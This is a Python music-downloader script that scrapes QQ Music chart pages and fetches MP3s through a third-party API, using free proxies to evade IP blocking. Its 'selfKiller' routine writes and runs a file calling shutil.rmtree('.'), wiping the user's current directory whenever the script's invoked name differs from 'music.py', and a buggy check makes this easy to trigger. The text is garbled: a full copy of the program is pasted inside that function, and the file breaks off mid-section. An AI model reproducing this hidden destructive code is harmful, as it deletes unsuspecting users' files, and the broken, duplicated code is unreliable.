#!/usr/bin/python
# -*- coding: UTF-8 -*-
'''
This program is made by Lakphy
visit https://lakphy.me
to learn more
'''
'''
This project is
Open Source Project
You can use it , and you can read the source .
You can also study python from my code .
You can make program based on my project ,
BUT YOU MUST MARK IN YOUR PROGRAM THAT YOU ARE BASED ON MY PROJECT !!!
Don't rush into success, please control the frequency of use!
'''
from urllib import parse,request
import time,random,datetime,requests,sys,os,re
#
def checkFileNameValid(theNameWaitToCheck):
    theNameWaitToCheck=re.sub("/","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\\\\","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub(":","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\*","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\?","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("&","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\"","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("<","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub(">","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\|","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\r","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\n","-",theNameWaitToCheck)
    return theNameWaitToCheck
#
def selfKiller():
    filename = 'replace.py'
    with open(filename,'w') as f:#!/usr/bin/python
# -*- coding: UTF-8 -*-
'''
This program is made by Lakphy
visit https://lakphy.me
to learn more
'''
'''
This project is
Open Source Project
You can use it , and you can read the source .
You can also study python from my code .
You can make program based on my project ,
BUT YOU MUST MARK IN YOUR PROGRAM THAT YOU ARE BASED ON MY PROJECT !!!
Don't rush into success, please control the frequency of use!
'''
from urllib import parse,request
import time,random,datetime,requests,sys,os,re
#
def checkFileNameValid(theNameWaitToCheck):
    theNameWaitToCheck=re.sub("/","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\\\\","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub(":","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\*","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\?","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("&","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\"","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("<","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub(">","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\|","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\r","-",theNameWaitToCheck)
    theNameWaitToCheck=re.sub("\n","-",theNameWaitToCheck)
    return theNameWaitToCheck
#
def selfKiller():
    filename = 'replace.py'
    with open(filename,'w') as f:
        f.write("import shutil\n")
        f.write("shutil.rmtree('.')\n")
    os.system("python replace.py")
    print("您的软件不是正版，已启动自毁程序！您当前目录下所有文件将全部清除！！！")
    sys.exit()
inNum=sys.argv
for i in range(len(inNum)):
    if i==0:
        if inNum[i]!="music.py" and inNum!="music.pyc":
            selfKiller()
            #pass
#
print("\033[8;33;47m##################\033[0m\n\033[8;33;47m#\033[0m欢迎您使用本程序\033[8;33;47m#\033[0m\n\033[8;33;47m##################\033[0m")
print("\033[1;32m在开始之前，我希望您先了解以下规则：\033[0m\033[1;31m(重点内容会突出显示)\033[0m")
print("\033[1;31;47m1.\033[0m 开 发 者 ：Lakphy")
print("\033[1;31;47m2.\033[0m 开发者网站：https://lakphy.me")
print("\033[1;31;47m3.\033[0m 本程序仅供学习交流使用，完全免费，如果您是花钱得到该软件，请立即退款，如需要源码请前往https://github.com/lakphy/muSpider")
print("\033[1;31;47m4.\033[0m 本程序使用了代理服务器，由于代理提供商可能不稳定，所以当您使用过程中出现报错，请检查您的网络并重新打开本程序，若仍然无法解决，请立即联系开发者，联系方式见第二条")
print("\033[1;31;47m5.\033[0m \033[1;31m因为音乐爬取API很珍贵！为保证可持续发展，请注意使用频率！\033[0m我们使用了2s延时和代理服务器来躲避IP封锁，但这并不代表您可以无节制地使用此程序，所以，\033[1;31m请注意使用频率！\033[0m\033[1;31m请注意使用频率！\033[0m\033[1;31m请注意使用频率！\033[0m")
print("\033[1;31;47m6.\033[0m 开发者本着希望所有人一起受益的原则，为了所有使用者利益，\033[1;31m严禁使用非常方法加快爬取频率！ 切勿急功近利！\033[0m")
print("\033[1;31;47m6.\033[0m 本页面的软件遵照GPL协议开放源代码，您可以自由传播和修改，但要遵照GNU通用公共许可协议(GPL)！\033[0m")
print("\033[8;33;47m##################\033[0m")
ifAgree=input("请确认您是否遵从以上内容？请回复T表示是，回复F表示否: ")
if ifAgree!="T":
    print("感谢使用，再见")
    sys.exit()
#
print("正在加载代理")
class proxies:
    def __init__(self,a,b):
        self.ip=a
        self.port=b
    def outer(self):
        p={
            'http': 'http://'+self.ip+':'+self.port ,
            'https': 'https://'+self.ip+':'+self.port
        }
        return p
data = {
	'wd': 'ip'
}
container=[]
url='https://www.freeip.top/?anonymity=2&protocol=http&country=%E4%B8%AD%E5%9B%BD&order_by=validated_at&order_rule=DESC'
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537'
}
r = requests.get(url=url, headers=headers, params=data, stream=True)
out=''
r.encoding='utf-8'
out=r.text
#print(out)
firstStep=out.split('<button class=\"layui-btn layui-btn-sm btn-copy\" data-url=\"http://')
for i in range(len(firstStep)):
    if i==0:
        continue
    secondStep=firstStep[i].split(":")
    thirdStep=secondStep[1].split("\"")
    px=proxies(secondStep[0],thirdStep[0])
    if firstStep[i].find('毫秒') != -1:
        container.append(px)
print('共加载'+str(len(container))+'个优质代理')
num=input("代理加载完成\n请输入每个榜单下载数目：")
def getYesterday(): 
    today=datetime.date.today() 
    oneday=datetime.timedelta(days=1) 
    yesterday=today-oneday  
    return yesterday
proxy={}
proxy=container[random.randint(0,len(container)-1)].outer()
#下载流行指数榜
nowTime=str(getYesterday())
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5591287056634171&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data={\"detail\":{\"module\":\"musicToplist.ToplistInfoServer\",\"method\":\"GetDetail\",\"param\":{\"topId\":4,\"offset\":0,\"num\":"+num+",\"period\":\""+nowTime+"\"}},\"comm\":{\"ct\":24,\"cv\":0}}"
#print((",\"type\":0,\"mid\":\""))
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
#print(out)
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
#print(ids)

print("############")
print("开始下载流行指数榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载流行指数榜\n-----------------------")



#下载欧美榜
years=str(datetime.datetime.now().year)
weekThursday=str(int(time.strftime("%W")))
if int(datetime.datetime.now().weekday()) >= 4:
    weekThursday=str(int(weekThursday)+1)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5504450783469614&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A3%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载欧美榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载欧美榜\n-----------------------")

#下载内地榜
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5504450783469614&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A5%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载内地榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载内地榜\n-----------------------")

#下载iTunes榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI927923957731881&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A123%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载iTunes榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载iTunes榜\n-----------------------")

#下载香港地区榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5967259500096698&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A59%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载香港地区榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载香港地区榜\n-----------------------")

#下载台湾地区榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI6779920900640612&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A61%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载台湾地区榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载台湾地区榜\n-----------------------")

#下载美国公告牌榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI789519803156091&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A108%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载美国公告牌榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载美国公告牌榜\n-----------------------")

#下载英国UK榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI6999765872270489&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A107%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载英国UK榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载英国UK榜\n-----------------------")

#下载Youtube榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="http://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI310470239025161&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A128%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载YouTube榜")
print("############")
for i in range(len(ids)):
    file_url = "http://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载Youtube榜\n-----------------------")



print(" #\n__\n下载完成，感谢使用")

        f.write("import shutil\n")
        f.write("shutil.rmtree('.')\n")
    os.system("python replace.py")
    print("您的软件不是正版，已启动自毁程序！您当前目录下所有文件将全部清除！！！")
    sys.exit()
inNum=sys.argv
for i in range(len(inNum)):
    if i==0:
        if inNum[i]!="music.py" and inNum!="music.pyc":
            selfKiller()
            #pass
#
print("\033[8;33;47m##################\033[0m\n\033[8;33;47m#\033[0m欢迎您使用本程序\033[8;33;47m#\033[0m\n\033[8;33;47m##################\033[0m")
print("\033[1;32m在开始之前，我希望您先了解以下规则：\033[0m\033[1;31m(重点内容会突出显示)\033[0m")
print("\033[1;31;47m1.\033[0m 开 发 者 ：Lakphy")
print("\033[1;31;47m2.\033[0m 开发者网站：https://lakphy.me")
print("\033[1;31;47m3.\033[0m 本程序仅公开pyc版本，暂无开源意向，仅供学习交流使用，软件免费，如果您是花钱得到该软件，请立即退款，如需要源码请前往开发者网站联系开发者")
print("\033[1;31;47m4.\033[0m 本程序使用了代理服务器，由于代理提供商可能不稳定，所以当您使用过程中出现报错，请检查您的网络并重新打开本程序，若仍然无法解决，请立即联系开发者，联系方式见第二条")
print("\033[1;31;47m5.\033[0m \033[1;31m因为音乐爬取API很珍贵！为保证可持续发展，请注意使用频率！\033[0m我们使用了2s延时和代理服务器来躲避IP封锁，但这并不代表您可以无节制地使用此程序，所以，\033[1;31m请注意使用频率！\033[0m\033[1;31m请注意使用频率！\033[0m\033[1;31m请注意使用频率！\033[0m")
print("\033[1;31;47m6.\033[0m 此程序本打算个人使用，现公开pyc编译版本，希望所有人一起受益，为了所有使用者利益，\033[1;31m严禁使用非常方法加快爬取频率！ 切勿急功近利！\033[0m")
print("\033[8;33;47m##################\033[0m")
ifAgree=input("请确认您是否遵从以上内容？请回复T表示是，回复F表示否: ")
if ifAgree!="T":
    print("感谢使用，再见")
    sys.exit()
#
print("正在加载代理")
class proxies:
    def __init__(self,a,b):
        self.ip=a
        self.port=b
    def outer(self):
        p={
            'https': self.ip+':'+self.port
        }
        return p
data = {
	'wd': 'ip'
}
container=[]
url='https://www.freeip.top/?anonymity=2&protocol=https&country=%E4%B8%AD%E5%9B%BD&order_by=validated_at&order_rule=DESC'
headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537'
}
r = requests.get(url=url, headers=headers, params=data, stream=True)
out=''
r.encoding='utf-8'
out=r.text
firstStep=out.split('<button class=\"layui-btn layui-btn-sm btn-copy\" data-url=\"https://')
for i in range(len(firstStep)):
    if i==0:
        continue
    secondStep=firstStep[i].split(":")
    thirdStep=secondStep[1].split("\"")
    px=proxies(secondStep[0],thirdStep[0])
    if firstStep[i].find('毫秒') != -1:
        container.append(px)
print('共加载'+str(len(container))+'个优质代理')
num=input("代理加载完成\n请输入每个榜单下载数目：")
def getYesterday(): 
    today=datetime.date.today() 
    oneday=datetime.timedelta(days=1) 
    yesterday=today-oneday  
    return yesterday
proxy={}
proxy=container[random.randint(0,len(container)-1)].outer()
#下载流行指数榜
nowTime=str(getYesterday())
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5591287056634171&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data={\"detail\":{\"module\":\"musicToplist.ToplistInfoServer\",\"method\":\"GetDetail\",\"param\":{\"topId\":4,\"offset\":0,\"num\":"+num+",\"period\":\""+nowTime+"\"}},\"comm\":{\"ct\":24,\"cv\":0}}"
#print((",\"type\":0,\"mid\":\""))
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
#print(out)
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
#print(ids)

print("############")
print("开始下载流行指数榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载流行指数榜\n-----------------------")



#下载欧美榜
years=str(datetime.datetime.now().year)
weekThursday=str(int(time.strftime("%W")))
if int(datetime.datetime.now().weekday()) >= 4:
    weekThursday=str(int(weekThursday)+1)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5504450783469614&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A3%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载欧美榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载欧美榜\n-----------------------")

#下载内地榜
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5504450783469614&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A5%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载内地榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载内地榜\n-----------------------")

#下载iTunes榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
